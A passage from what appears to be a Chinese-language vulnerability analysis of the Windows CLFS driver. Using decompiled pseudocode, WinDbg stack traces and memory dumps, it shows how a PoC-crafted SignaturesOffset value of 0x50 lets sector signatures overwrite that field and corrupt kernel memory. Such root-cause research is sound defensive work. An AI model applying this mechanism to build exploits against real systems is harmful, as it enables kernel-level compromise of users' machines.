打开现有日志文件会调用这里、</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">*</span>(CClfsBaseFilePersisted<span style="color:#f92672">**</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">680</span>),</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>Destination,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">const</span><span style="color:#66d9ef">struct</span> _CLFS_FILTER_CONTEXT<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v88,</span></span><span style="display:flex;"><span> a10,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v94);</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AcquireClientContext</span>(<span style="color:#f92672">*</span>(PERESOURCE<span style="color:#f92672">**</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">680</span>),<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>v77);<span style="color:#75715e">// 获取客户端上下文</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (v77<span style="color:#f92672">-></span>eState<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(ULONG_PTR))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)a1<span style="color:#f92672">+</span><span style="color:#ae81ff">312</span>i64))(a1) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CClfsLogFcbPhysical<span style="color:#f92672">::</span><span style="color:#a6e22e">ResetLog</span>((CClfsLogFcbPhysical<span style="color:#f92672">*</span>)a1);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">348</span>)<span style="color:#f92672">|=</span><span style="color:#ae81ff">0x40u</span>;</span></span><span style="display:flex;"><span> v39<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)EventObject;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>继续调试，调试器在<code>ClfsEncodeBlockPrivate</code>断下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> k</span></span><span style="display:flex;"><span><span style="color:#75715e"># Child-SP RetAddr Call Site</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">00</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53916f</span><span style="color:#ae81ff">70</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d6802d CLFS<span style="color:#f92672">!</span>ClfsEncodeBlockPrivate<span style="color:#f92672">+</span><span style="color:#ae81ff">0xee</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53916f</span>b0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d92232 CLFS<span style="color:#f92672">!</span>ClfsEncodeBlock<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53916f</span>e0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d899a0 CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>WriteMetadataBlock<span style="color:#f92672">+</span><span style="color:#ae81ff">0x152</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917070</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d6161f CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>FlushImage<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539170</span>b0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d63701 CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>FlushMetadata<span style="color:#f92672">+</span><span style="color:#ae81ff">0xef</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917100</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d8eaeb CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>Initialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc85</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917240</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d90a2b CLFS<span style="color:#f92672">!</span>CClfsRequest<span style="color:#f92672">::</span>Create<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4ef</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917390</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d907f7 CLFS<span style="color:#f92672">!</span>CClfsRequest<span style="color:#f92672">::</span>Dispatch<span style="color:#f92672">+</span><span style="color:#ae81ff">0x97</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539173e0</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d90747 CLFS<span style="color:#f92672">!</span>ClfsDispatchIoRequest<span style="color:#f92672">+</span><span style="color:#ae81ff">0x87</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917430</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">668</span>abac5 CLFS<span style="color:#f92672">!</span>CClfsDriver<span style="color:#f92672">::</span>LogIoDispatch<span style="color:#f92672">+</span><span style="color:#ae81ff">0x27</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>a fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917460</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">668629</span>a4 nt<span style="color:#f92672">!</span>IofCallDriver<span style="color:#f92672">+</span><span style="color:#ae81ff">0x55</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>b fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539174</span>a0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>bf1dfd nt<span style="color:#f92672">!</span>IoCallDriverWithTracing<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>c fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539174f</span><span style="color:#ae81ff">0</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c20cbe nt<span style="color:#f92672">!</span>IopParseDevice<span style="color:#f92672">+</span><span style="color:#ae81ff">0x117d</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917660</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c01d3a nt<span style="color:#f92672">!</span>ObpLookupObjectName<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3fe</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>e fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917830</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c88f0f nt<span style="color:#f92672">!</span>ObOpenObjectByNameEx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1fa</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0f</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917960</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c88ae9 nt<span style="color:#f92672">!</span>IopCreateFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917</span>a00 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>a0a2b5 nt<span style="color:#f92672">!</span>NtCreateFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x79</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917</span>a90<span style="color:#ae81ff">00007ff</span>a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91</span>b0d9e4 nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd<span style="color:#f92672">+</span><span style="color:#ae81ff">0x25</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span><span style="color:#ae81ff">0000005</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span>ec6fe888<span style="color:#ae81ff">00007ff</span>a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8</span>bc92199 ntdll<span style="color:#f92672">!</span>NtCreateFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">0000005</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span>ec6fe890<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">0x00007ffa</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8</span>bc92199</span></span></code></pre></div><p><code>ClfsEncodeBlockPrivate</code>伪代码：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ClfsEncodeBlockPrivate</span>(</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">*</span>a1,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span> UCHAR a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ClientId_low;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>......</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ClientId_low<span style="color:#f92672">=</span><span style="color:#a6e22e">LOWORD</span>(a1<span style="color:#f92672">-></span>ClientId);</span></span><span style="display:flex;"><span> v21[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#75715e">// 段签名数组</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(_WORD)ClientId_low<span style="color:#f92672">||</span><span style="color:#a6e22e">HIWORD</span>(a1<span style="color:#f92672">-></span>ClientId)<span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)ClientId_low<span style="color:#f92672">||</span> ClientId_low<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span><span style="color:#f92672">></span> a2 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929418</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a4<span style="color:#f92672">></span><span style="color:#ae81ff">0x10u</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225485</span>i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#ae81ff">65809</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_bittest</span>(<span style="color:#f92672">&amp;</span>v8, a4) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225485</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (a1<span style="color:#f92672">-></span>Checksum<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929418</span>i64;</span></span><span style="display:flex;"><span> SignaturesOffset<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>SignaturesOffset;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> a2<span style="color:#f92672">>></span><span style="color:#ae81ff">9</span>;<span style="color:#75715e">// 3D</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> a1<span style="color:#f92672">-></span>Usn<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HIBYTE</span>(v22)<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongAdd</span>(SignaturesOffset,<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span> (a2<span style="color:#f92672">>></span><span style="color:#ae81ff">9</span>), v21)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> v21[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&lt;</span> v11<span style="color:#f92672">||</span> (v11<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> v21[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">></span> a2 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929418</span>i64;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v10 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>i64;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">!=</span> v15 )</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v18<span style="color:#f92672">=</span> v17<span style="color:#f92672">|</span> v16;</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span> v15<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span>;<span style="color:#75715e">// 段偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">LOBYTE</span>(v22)<span style="color:#f92672">=</span> a4<span style="color:#f92672">|</span> v18;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v15;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)(v14<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)(v19<span style="color:#f92672">+</span> v13<span style="color:#f92672">+</span><span style="color:#ae81ff">510</span>);<span style="color:#75715e">// 循环相加，第14个段的签名会覆盖到SignatureOffset</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v19<span style="color:#f92672">+</span> v13<span style="color:#f92672">+</span><span style="color:#ae81ff">510</span>)<span style="color:#f92672">=</span> v22;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v15<span style="color:#f92672">&lt;</span> v10 );</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">=</span> v12<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFC</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该代码获取<code>LOG_BLOCK_HEADER→SignaturesOffset</code>的值，在PoC内已被设为0x50，而后循环读取每个扇区的签名并覆盖到<code>SignaturesOffset</code>偏移处，此时将从0x50开始写入数据，每次写入0x2个字节。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span><span style="color:#ae81ff">0xd</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">26</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000001</span>a</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rr11</span></span><span style="display:flex;"><span>r11<span style="color:#f92672">=</span>ffffab0523ecf06a</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>r11<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1a</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#f92672">-</span><span style="color:#ae81ff">93436410793904</span><span style="color:#f92672">=</span> ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf050</span></span></code></pre></div><p>在第十三个扇区覆盖时，偏移已经到了<code>SignatureOffset</code>处，第十三个扇区签名为0x0050，所以<code>SignatureOffset</code> 低2位为0050</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf050<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#f92672">-</span><span style="color:#ae81ff">93436410793880</span><span style="color:#f92672">=</span> ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf068</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span> CLFS_LOG_BLOCK_HEADER struc ; (<span style="color:#66d9ef">sizeof</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0x70</span>, align<span style="color:#f92672">=</span><span style="color:#ae81ff">0x8</span>, copyof_491)</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span> MajorVersion db<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span> MinorVersion db<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000002</span> Usn db<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000003</span> db<span style="color:#f92672">?</span> ; undefined</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000004</span> ClientId dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">8</span> TotalSectorCount dw<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000</span>A ValidSectorCount dw<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000</span>C Padding dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span> Checksum dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000014</span> Flags dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span> CurrentLsn CLFS_LSN<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000020</span> NextLsn CLFS_LSN<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000002</span><span style="color:#ae81ff">8</span> RecordOffsets dd<span style="color:#ae81ff">16</span><span style="color:#a6e22e">dup</span>(<span style="color:#f92672">?</span>)</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000006</span><span style="color:#ae81ff">8</span> SignaturesOffset dd<span style="color:#f92672">?</span></span></span></code></pre></div><p>第十四个扇区签名已经被覆盖为<code>0xFFFF</code>，再将第十四个扇区覆盖在<code>SignatureOffset</code>高两位字节，<code>SignatureOffset</code>值变为<code>0XFFFF0050</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffab0523ecf000 L0x80</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf000<span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....<span style="color:#f92672">=</span>.<span style="color:#f92672">=</span>.........</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf010<span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf020<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">70</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........p.......</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf030<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf040<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf050<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf060<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">00</span> ff ff<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........P.......</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf070<span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">27</span><span style="color:#ae81ff">86</span> fc<span style="color:#ae81ff">26</span><span style="color:#ae81ff">07</span><span 